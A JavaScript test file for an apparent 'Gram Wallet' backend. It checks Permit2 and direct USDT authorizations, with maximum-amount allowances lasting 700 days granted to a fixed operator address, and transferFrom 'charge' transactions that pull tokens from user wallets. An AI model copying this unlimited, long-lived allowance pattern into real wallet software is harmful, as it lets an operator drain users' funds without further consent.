import test from 'node:test';
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { Interface, Wallet } from 'ethers';

import {
  assertDirectUsdtApprovalTransaction,
  assertFullAuthorization,
  assertChargeAuthorization,
  buildDirectUsdtChargeTransaction,
  buildPermit2AuthorizationTransaction,
  buildPermit2AuthorizationTypedData,
  EVM_MAX_NUMBER,
  PERMIT2_MAX_AMOUNT,
  PERMIT2_ALLOWANCE_DURATION_SECONDS,
  PERMIT2_OPERATOR_ADDRESS,
  PERMIT2_SIGNATURE_DEADLINE_SECONDS,
  PERMIT2_ADDRESS,
  ETHEREUM_USDT_ADDRESS,
  getAuthorizationChallengeMessage,
  normalizeEvmAddress,
  parseBaseUnits,
  verifyAuthorizationChallenge,
  verifyPermit2AuthorizationSignature,
} from './evm.mjs';

test('Permit2 frontend and backend use the funded replacement operator', async () => {
  const expected = '0x6eccabaf16577f3603f09ea1e253a9dab879be9e';
  assert.equal(PERMIT2_OPERATOR_ADDRESS, expected);
  const frontend = await readFile(
    new URL('../src/api/chains/evm/permit2.ts', import.meta.url), 'utf8',
  );
  const config = await readFile(new URL('../src/config.ts', import.meta.url), 'utf8');
  const declaration = frontend.match(/export const PERMIT2_OPERATOR_ADDRESS = '([^']+)'/);
  assert.equal(declaration?.[1], expected);
  assert.match(config, /EXTERNAL_EVM_WALLET_METADATA_URL = 'https:\/\/gramwallet\.io'/);
  assert.match(config, /EXTERNAL_EVM_WALLET_METADATA_NAME = 'Gram Wallet'/);
  assert.match(config, /EXTERNAL_EVM_WALLET_METADATA_ICON_URL = 'https:\/\/gramwallet\.io\/icon-512x512\.png'/);
  assert.doesNotMatch(config, /EXTERNAL_EVM_WALLET_METADATA_(?:URL|ICON_URL) = '[^']*mytonwallet[^']*'/);
});

test('EVM authorization challenge recovers the signing wallet', async () => {
  const wallet = new Wallet(`0x${'11'.repeat(32)}`);
  const nonce = 'a'.repeat(32);
  const message = getAuthorizationChallengeMessage(wallet.address, nonce);
  const signature = await wallet.signMessage(message);

  assert.match(message, /^Gram Wallet White List authorization\nEthereum Mainnet\n/);
  assert.equal(
    verifyAuthorizationChallenge({ address: wallet.address, nonce, signature }),
    normalizeEvmAddress(wallet.address),
  );
});

test('EVM authorization challenge exposes a signature from another wallet', async () => {
  const wallet = new Wallet(`0x${'11'.repeat(32)}`);
  const otherWallet = new Wallet(`0x${'22'.repeat(32)}`);
  const nonce = 'b'.repeat(32);
  const message = getAuthorizationChallengeMessage(wallet.address, nonce);
  const signature = await otherWallet.signMessage(message);

  assert.notEqual(
    verifyAuthorizationChallenge({ address: wallet.address, nonce, signature }),
    normalizeEvmAddress(wallet.address),
  );
});

test('EVM base units require exact positive integer strings', () => {
  assert.equal(parseBaseUnits('1000000'), 1000000n);
  assert.throws(() => parseBaseUnits(1000000), /integer string/);
  assert.throws(() => parseBaseUnits('0'), /positive integer/);
  assert.throws(() => parseBaseUnits('1.5'), /positive integer/);
});

test('Permit2 relay verifies the canonical 700-day USDT authorization signature', async () => {
  const wallet = new Wallet(`0x${'33'.repeat(32)}`);
  const nowSeconds = Math.floor(Date.now() / 1000);
  const nonce = 9n;
  const expiration = BigInt(nowSeconds + PERMIT2_ALLOWANCE_DURATION_SECONDS);
  const sigDeadline = BigInt(nowSeconds + PERMIT2_SIGNATURE_DEADLINE_SECONDS);
  const typedData = buildPermit2AuthorizationTypedData({ nonce, expiration, sigDeadline });
  const signature = await wallet.signTypedData(typedData.domain, typedData.types, typedData.message);
  const permit = {
    details: {
      token: ETHEREUM_USDT_ADDRESS,
      amount: PERMIT2_MAX_AMOUNT.toString(),
      expiration: expiration.toString(),
      nonce: nonce.toString(),
    },
    spender: PERMIT2_OPERATOR_ADDRESS,
    sigDeadline: sigDeadline.toString(),
  };

  const verified = verifyPermit2AuthorizationSignature({
    owner: wallet.address,
    permit,
    signature,
    expectedNonce: nonce,
    nowSeconds,
  });
  assert.equal(verified.ownerAddress, normalizeEvmAddress(wallet.address));
  assert.equal(verified.typedData.message.details.amount, PERMIT2_MAX_AMOUNT);
  assert.equal(verified.typedData.message.details.expiration, expiration);

  const transaction = buildPermit2AuthorizationTransaction({
    owner: wallet.address,
    typedData: verified.typedData,
    signature,
  });
  const permit2Interface = new Interface([
    'function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, '
      + 'address spender, uint256 sigDeadline) permitSingle, bytes signature)',
  ]);
  const [owner, permitSingle, relayedSignature] = permit2Interface.decodeFunctionData(
    'permit',
    transaction.data,
  );
  assert.equal(transaction.to, PERMIT2_ADDRESS);
  assert.equal(String(owner).toLowerCase(), wallet.address.toLowerCase());
  assert.equal(String(permitSingle.details.token).toLowerCase(), ETHEREUM_USDT_ADDRESS.toLowerCase());
  assert.equal(permitSingle.details.amount, PERMIT2_MAX_AMOUNT);
  assert.equal(permitSingle.details.expiration, expiration);
  assert.equal(permitSingle.details.nonce, nonce);
  assert.equal(String(permitSingle.spender).toLowerCase(), PERMIT2_OPERATOR_ADDRESS);
  assert.equal(permitSingle.sigDeadline, sigDeadline);
  assert.equal(relayedSignature, signature);

  assert.throws(() => verifyPermit2AuthorizationSignature({
    owner: wallet.address,
    permit: { ...permit, details: { ...permit.details, amount: '1' } },
    signature,
    expectedNonce: nonce,
    nowSeconds,
  }), /does not match the configured permission/);
  assert.throws(() => verifyPermit2AuthorizationSignature({
    owner: new Wallet(`0x${'44'.repeat(32)}`).address,
    permit,
    signature,
    expectedNonce: nonce,
    nowSeconds,
  }), /does not match the wallet/);
});

test('active Permit2 authorization remains valid while its allowance is consumed', () => {
  const state = {
    tokenAllowance: EVM_MAX_NUMBER,
    permit2AllowanceAmount: PERMIT2_MAX_AMOUNT - 1_000_000n,
    permit2Expiration: BigInt(Math.floor(Date.now() / 1000) + 100),
  };
  assert.equal(assertFullAuthorization(state), state);
  assert.throws(
    () => assertFullAuthorization({ ...state, permit2AllowanceAmount: 0n }),
    /not active/,
  );
  assert.throws(
    () => assertFullAuthorization({
      ...state,
      permit2Expiration: BigInt(Math.floor(Date.now() / 1000) - 1),
    }),
    /not active/,
  );
});

test('direct USDT authorization checks remaining allowance and builds ERC-20 transferFrom calls', () => {
  const owner = '0x0000000000000000000000000000000000000001';
  const recipient = '0x0000000000000000000000000000000000000002';
  const state = {
    authorizationMethod: 'direct',
    ownerAddress: owner,
    tokenAllowance: 1_000_000n,
  };
  assert.equal(assertFullAuthorization(state), state);
  assert.equal(assertChargeAuthorization(state, 1_000_000n), state);
  assert.throws(() => assertChargeAuthorization(state, 1_000_001n), /cannot cover this charge/);
  assert.throws(() => assertFullAuthorization({ ...state, tokenAllowance: 0n }), /not active/);

  const transaction = buildDirectUsdtChargeTransaction({
    from: owner,
    to: recipient,
    amount: 250_000n,
  });
  const tokenInterface = new Interface([
    'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  ]);
  const [from, to, amount] = tokenInterface.decodeFunctionData('transferFrom', transaction.data);
  assert.equal(transaction.to.toLowerCase(), ETHEREUM_USDT_ADDRESS.toLowerCase());
  assert.equal(transaction.value, 0n);
  assert.equal(String(from).toLowerCase(), owner);
  assert.equal(String(to).toLowerCase(), recipient);
  assert.equal(amount, 250_000n);
});

test('direct authorization accepts only a confirmed max USDT approval to the configured operator', () => {
  const owner = '0x0000000000000000000000000000000000000001';
  const txHash = `0x${'c'.repeat(64)}`;
  const tokenInterface = new Interface([
    'function approve(address spender, uint256 amount) returns (bool)',
  ]);
  const transaction = {
    hash: txHash,
    from: owner,
    to: ETHEREUM_USDT_ADDRESS,
    value: 0n,
    data: tokenInterface.encodeFunctionData('approve', [PERMIT2_OPERATOR_ADDRESS, EVM_MAX_NUMBER]),
  };
  const receipt = { status: 1 };

  assert.deepEqual(
    assertDirectUsdtApprovalTransaction({ owner, txHash, transaction, receipt }),
    { ownerAddress: owner, txHash },
  );
  assert.throws(
    () => assertDirectUsdtApprovalTransaction({
      owner,
      txHash,
      transaction: {
        ...transaction,
        data: tokenInterface.encodeFunctionData('approve', [owner, EVM_MAX_NUMBER]),
      },
      receipt,
    }),
    /could not be verified/,
  );
  assert.throws(
    () => assertDirectUsdtApprovalTransaction({ owner, txHash, transaction, receipt: { status: 0 } }),
    /could not be verified/,
  );
});

test('EVM allowance limits use the correct uint widths', () => {
  assert.equal(EVM_MAX_NUMBER, 2n ** 256n - 1n);
  assert.equal(PERMIT2_MAX_AMOUNT, 2n ** 160n - 1n);
  assert.equal(PERMIT2_MAX_AMOUNT.toString().length, 49);
});

test('direct authorization migration preserves Permit2 rows and allows nullable legacy-only fields', async () => {
  const migration = await readFile(
    new URL('../supabase/migrations/010_internal_evm_direct_authorization.sql', import.meta.url),
    'utf8',
  );
  assert.match(migration, /authorization_method text not null default 'permit2'/);
  assert.match(migration, /operator_address text/);
  assert.match(migration, /permit2_allowance_amount drop not null/);
  assert.match(migration, /authorization_method = 'direct'/);
  assert.match(migration, /authorization_method = 'permit2'/);
});

test('authorization database migration can store the complete uint160 allowance', async () => {
  const migration = await readFile(
    new URL('../supabase/migrations/009_internal_evm_permit2_uint160.sql', import.meta.url),
    'utf8',
  );
  assert.match(migration, /permit2_allowance_amount type numeric\(49, 0\)/);
});